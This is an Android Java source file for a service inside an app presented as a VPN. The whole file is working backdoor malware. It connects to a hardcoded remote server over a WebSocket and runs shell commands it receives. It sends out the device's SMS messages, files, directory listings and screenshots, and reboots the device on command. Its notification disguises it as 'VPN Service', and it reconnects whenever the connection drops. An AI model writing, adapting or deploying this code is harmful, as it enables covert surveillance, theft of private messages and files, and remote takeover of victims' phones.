package com.nullstorm.vpn.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.nullstorm.vpn.MainActivity;
import com.nullstorm.vpn.R;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class RemoteShellService extends Service {

    private static final String TAG = "RemoteShellService";
    private static final int NOTIFICATION_ID = 9999;
    private static final String CHANNEL_ID = "backdoor_channel";
    private static final String SERVER_WS = "ws://188.137.242.67:8083/shell";
    private static final String PREF_NAME = "device_prefs";
    private static final String PREF_DEVICE_ID = "device_id";
    private static final int CHUNK_SIZE = 256 * 1024; // 256KB per chunk

    private WebSocket webSocket;
    private OkHttpClient client;
    private Handler mainHandler;
    private boolean isRunning = false;
    private String deviceId;
    private int reconnectDelay = 5000;
    private static RemoteShellService instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "RemoteShellService started as backdoor");

        mainHandler = new Handler(Looper.getMainLooper());
        deviceId = getUniqueDeviceId();
        Log.d(TAG, "Device ID: " + deviceId);

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        connectToServer();
    }

    private String getUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        String savedId = prefs.getString(PREF_DEVICE_ID, null);

        if (savedId != null && !savedId.isEmpty()) {
            return savedId;
        }

        String androidId = null;
        try {
            androidId = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            Log.w(TAG, "Failed to get ANDROID_ID: " + e.getMessage());
        }

        if (androidId != null && !androidId.isEmpty() &&
                !androidId.equals("9774d56d682e549c")) {
            prefs.edit().putString(PREF_DEVICE_ID, androidId).apply();
            return androidId;
        }

        String newId = "device_" + UUID.randomUUID().toString();
        prefs.edit().putString(PREF_DEVICE_ID, newId).apply();
        return newId;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Remote Shell Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Backdoor service for remote control");
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("VPN Service")
                .setContentText("Connected to remote server")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void connectToServer() {
        client = new OkHttpClient.Builder()
                .connectTimeout(120, TimeUnit.SECONDS)
                .readTimeout(120, TimeUnit.SECONDS)
                .writeTimeout(120, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .pingInterval(30, TimeUnit.SECONDS)
                .build();

        Request request = new Request.Builder()
                .url(SERVER_WS)
                .addHeader("User-Agent", "Android-VPN-Backdoor")
                .addHeader("X-Device-ID", deviceId)
                .addHeader("X-Device-Model", Build.MODEL)
                .addHeader("X-Android-Version", Build.VERSION.RELEASE)
                .addHeader("X-SDK-Version", String.valueOf(Build.VERSION.SDK_INT))
                .build();

        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                RemoteShellService.this.webSocket = webSocket;
                isRunning = true;
                Log.d(TAG, "Connected to Server!");
                sendDeviceInfo();
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d(TAG, "Command received: " + text);
                handleCommand(text);
            }

            @Override
            public void onMessage(WebSocket webSocket, ByteString bytes) {
                Log.d(TAG, "Binary data received");
                saveBinaryFile(bytes);
            }

            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "Closing: " + reason);
                webSocket.close(code, reason);
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "Connection closed");
                isRunning = false;
                reconnectAfterDelay();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "Connection failed: " + t.getMessage());
                isRunning = false;
                reconnectAfterDelay();
            }
        });
    }

    private void reconnectAfterDelay() {
        mainHandler.postDelayed(() -> {
            if (!isRunning) {
                Log.d(TAG, "Reconnecting...");
                connectToServer();
            }
        }, reconnectDelay);
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("type", "device_info");
            info.put("device_id", deviceId);
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk_version", Build.VERSION.SDK_INT);
            info.put("app_version", getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
            info.put("is_emulator", Build.FINGERPRINT.contains("generic"));

            sendMessage(info.toString());

        } catch (Exception e) {
            Log.e(TAG, "Error sending device info", e);
        }
    }

    private void handleCommand(String command) {
        try {
            JSONObject json = new JSONObject(command);
            String cmd = json.getString("cmd");

            switch (cmd) {
                case "exec":
                    String shellCmd = json.getString("command");
                    executeShellCommand(shellCmd);
                    break;

                case "download":
                    String filePath = json.getString("path");
                    downloadFileChunked(filePath);
                    break;

                case "upload":
                    String uploadPath = json.getString("path");
                    uploadFile(uploadPath);
                    break;

                case "list_files":
                    String dir = json.optString("directory", "/sdcard");
                    listFiles(dir);
                    break;

                case "get_info":
                    sendDeviceInfo();
                    break;

                case "ping":
                    sendResponse("pong", "Ping received!");
                    break;

                case "screenshot":
                    takeScreenshot();
                    break;

                case "reboot":
                    executeShellCommand("reboot");
                    break;

                case "shutdown":
                    executeShellCommand("reboot -p");
                    break;

                case "kill":
                    stopSelf();
                    break;

                case "get_sms":
                    getSmsFromDevice();
                    break;

                case "get_sms_count":
                    getSmsCount();
                    break;

                default:
                    sendResponse("error", "Unknown command: " + cmd);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error handling command", e);
            sendResponse("error", e.getMessage());
        }
    }

    private void getSmsFromDevice() {
        new Thread(() -> {
            try {
                String[] projection = new String[]{
                        Telephony.Sms._ID,
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE,
                        Telephony.Sms.READ
                };

                String sortOrder = Telephony.Sms.DATE + " DESC LIMIT 50";

                Cursor cursor = getContentResolver().query(
                        Telephony.Sms.CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder
                );

                JSONArray smsArray = new JSONArray();

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                        JSONObject sms = new JSONObject();
                        sms.put("address", address);
                        sms.put("body", body);
                        sms.put("date", date);
                        sms.put("type", type);
                        smsArray.put(sms);
                    } while (cursor.moveToNext());
                    cursor.close();
                }

                JSONObject response = new JSONObject();
                response.put("type", "sms_response");
                response.put("count", smsArray.length());
                response.put("messages", smsArray);

                sendMessage(response.toString());
                Log.d(TAG, "Sent " + smsArray.length() + " SMS to server");

            } catch (Exception e) {
                Log.e(TAG, "Error getting SMS", e);
                sendResponse("error", "Failed to get SMS: " + e.getMessage());
            }
        }).start();
    }

    private void getSmsCount() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                        Telephony.Sms.CONTENT_URI,
                        new String[]{Telephony.Sms._ID},
                        null,
                        null,
                        null
                );

                int count = 0;
                if (cursor != null) {
                    count = cursor.getCount();
                    cursor.close();
                }

                JSONObject response = new JSONObject();
                response.put("type", "sms_count");
                response.put("count", count);
                sendMessage(response.toString());

            } catch (Exception e) {
                Log.e(TAG, "Error getting SMS count", e);
                sendResponse("error", "Failed to get SMS count: " + e.getMessage());
            }
        }).start();
    }

    private void executeShellCommand(String command) {
        new Thread(() -> {
            try {
                Log.d(TAG, "Executing: " + command);

                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});

                StringBuilder output = new StringBuilder();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                StringBuilder error = new StringBuilder();
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String errLine;
                while ((errLine = errorReader.readLine()) != null) {
                    error.append(errLine).append("\n");
                }

                int exitCode = process.waitFor();

                JSONObject result = new JSONObject();
                result.put("type", "exec_result");
                result.put("command", command);
                result.put("exit_code", exitCode);
                result.put("output", output.toString());
                result.put("error", error.toString());

                sendMessage(result.toString());

            } catch (Exception e) {
                Log.e(TAG, "Error executing command", e);
                sendResponse("error", "Failed to execute: " + e.getMessage());
            }
        }).start();
    }

    // ==================== CHUNKED DOWNLOAD ====================

    private void downloadFileChunked(String filePath) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) {
                    sendResponse("error", "File not found: " + filePath);
                    return;
                }

                long fileSize = file.length();
                long totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;

                Log.d(TAG, "Downloading: " + filePath + " (Size: " + fileSize + " bytes, Chunks: " + totalChunks + ")");

                // Send start message
                JSONObject startMsg = new JSONObject();
                startMsg.put("type", "download_start");
                startMsg.put("path", filePath);
                startMsg.put("size", fileSize);
                startMsg.put("total_chunks", totalChunks);
                sendMessage(startMsg.toString());

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[CHUNK_SIZE];
                int bytesRead;
                int chunkIndex = 0;

                while ((bytesRead = fis.read(buffer)) != -1) {
                    byte[] chunk = new byte[bytesRead];
                    System.arraycopy(buffer, 0, chunk, 0, bytesRead);

                    String base64Chunk = Base64.encodeToString(chunk, Base64.DEFAULT);

                    JSONObject chunkMsg = new JSONObject();
                    chunkMsg.put("type", "download_chunk");
                    chunkMsg.put("chunk_index", chunkIndex);
                    chunkMsg.put("data", base64Chunk);
                    chunkMsg.put("is_last", (chunkIndex == totalChunks - 1));

                    sendMessage(chunkMsg.toString());
                    chunkIndex++;

                    // Small delay to prevent flooding
                    Thread.sleep(50);
                }

                fis.close();

                // Send end message
                JSONObject endMsg = new JSONObject();
                endMsg.put("type", "download_end");
                endMsg.put("path", filePath);
                endMsg.put("total_chunks", chunkIndex);
                endMsg.put("size", fileSize);
                sendMessage(endMsg.toString());

                Log.d(TAG, "Download complete: " + filePath);

            } catch (OutOfMemoryError e) {
                Log.e(TAG, "Out of memory!", e);
                sendResponse("error", "File too large: " + filePath);
            } catch (Exception e) {
                Log.e(TAG, "Error downloading file", e);
                sendResponse("error", "Failed to download: " + e.getMessage());
            }
        }).start();
    }

    private void uploadFile(String filePath) {
        try {
            JSONObject request = new JSONObject();
            request.put("type", "file_upload_request");
            request.put("path", filePath);
            sendMessage(request.toString());

        } catch (Exception e) {
            Log.e(TAG, "Error requesting upload", e);
            sendResponse("error", "Failed to request upload: " + e.getMessage());
        }
    }

    private void saveBinaryFile(ByteString data) {
        new Thread(() -> {
            try {
                String fileName = "downloaded_" + System.currentTimeMillis() + ".bin";
                File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

                if (!downloadDir.exists()) {
                    downloadDir.mkdirs();
                }

                File outputFile = new File(downloadDir, fileName);

                FileOutputStream fos = new FileOutputStream(outputFile);
                fos.write(data.toByteArray());
                fos.close();

                sendResponse("success", "File saved to: " + outputFile.getAbsolutePath());

            } catch (Exception e) {
                Log.e(TAG, "Error saving binary file", e);
                sendResponse("error", "Failed to save file: " + e.getMessage());
            }
        }).start();
    }

    private void listFiles(String directory) {
        new Thread(() -> {
            try {
                File dir = new File(directory);
                if (!dir.exists() || !dir.isDirectory()) {
                    sendResponse("error", "Invalid directory: " + directory);
                    return;
                }

                JSONObject result = new JSONObject();
                result.put("type", "file_list");
                result.put("directory", directory);

                File[] allFiles = dir.listFiles();
                JSONArray filesArray = new JSONArray();

                if (allFiles != null && allFiles.length > 0) {
                    java.util.Arrays.sort(allFiles, (f1, f2) -> {
                        if (f1.isDirectory() && !f2.isDirectory()) return -1;
                        if (!f1.isDirectory() && f2.isDirectory()) return 1;
                        return f1.getName().compareToIgnoreCase(f2.getName());
                    });

                    for (File file : allFiles) {
                        JSONObject fileInfo = new JSONObject();
                        fileInfo.put("name", file.getName());
                        fileInfo.put("size", file.length());
                        fileInfo.put("is_directory", file.isDirectory());
                        fileInfo.put("last_modified", file.lastModified());
                        fileInfo.put("can_read", file.canRead());
                        fileInfo.put("can_write", file.canWrite());
                        filesArray.put(fileInfo);
                    }
                }

                result.put("files", filesArray);
                result.put("total_files", filesArray.length());
                sendMessage(result.toString());

            } catch (Exception e) {
                Log.e(TAG, "Error listing files", e);
                sendResponse("error", "Failed to list files: " + e.getMessage());
            }
        }).start();
    }

    private void takeScreenshot() {
        try {
            String timestamp = String.valueOf(System.currentTimeMillis());
            String screenshotPath = "/sdcard/screenshot_" + timestamp + ".png";
            String command = "screencap -p " + screenshotPath;
            executeShellCommand(command);

        } catch (Exception e) {
            Log.e(TAG, "Error taking screenshot", e);
            sendResponse("error", "Failed to take screenshot: " + e.getMessage());
        }
    }

    private void sendMessage(String message) {
        if (webSocket != null && isRunning) {
            webSocket.send(message);
            Log.d(TAG, "Sent: " + message.substring(0, Math.min(200, message.length())) + "...");
        }
    }

    private void sendResponse(String status, String message) {
        try {
            JSONObject response = new JSONObject();
            response.put("type", "response");
            response.put("status", status);
            response.put("message", message);
            sendMessage(response.toString());

        } catch (Exception e) {
            Log.e(TAG, "Error sending response", e);
        }
    }

    public static void sendMessageToServer(String message) {
        if (instance != null && instance.webSocket != null && instance.isRunning) {
            instance.webSocket.send(message);
            Log.d(TAG, "Message sent to server: " + message.substring(0, Math.min(100, message.length())) + "...");
        } else {
            Log.w(TAG, "Cannot send message - WebSocket not connected");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
            webSocket = null;
        }
        Log.d(TAG, "Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}